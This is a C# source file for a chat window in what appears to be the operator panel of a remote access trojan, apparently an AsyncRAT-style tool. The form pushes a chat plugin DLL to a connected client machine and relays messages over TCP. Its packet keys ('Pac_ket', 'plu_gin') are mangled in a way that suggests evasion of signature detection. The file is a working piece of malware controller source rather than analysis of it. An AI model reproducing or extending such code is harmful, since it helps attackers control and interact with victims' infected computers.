using Server.MessagePack;
using Server.Connection;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Server.Algorithm;

namespace Server.Forms
{
    public partial class FormChat : Form
    {
        public Form1 F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }

        private string Nickname = "Admin";
        public FormChat()
        {
            InitializeComponent();
        }

        private void FormChat_Load(object sender, EventArgs e)
        {
            string nick = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
            if (string.IsNullOrEmpty(nick))
                this.Close();
            else
            {
                Nickname = nick;
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Chat.dll"));
                ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (Client != null)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                catch { }
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Enabled && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                richTextBox1.SelectionColor = Color.Green;
                richTextBox1.AppendText("ME: \n");
                richTextBox1.SelectionColor = Color.Black;
                richTextBox1.AppendText(textBox1.Text + Environment.NewLine);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "chatWriteInput";
                msgpack.ForcePathObject("Input").AsString = Nickname + ": \n";
                msgpack.ForcePathObject("Input2").AsString = textBox1.Text;
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                textBox1.Clear();
            }
        }
    }
}
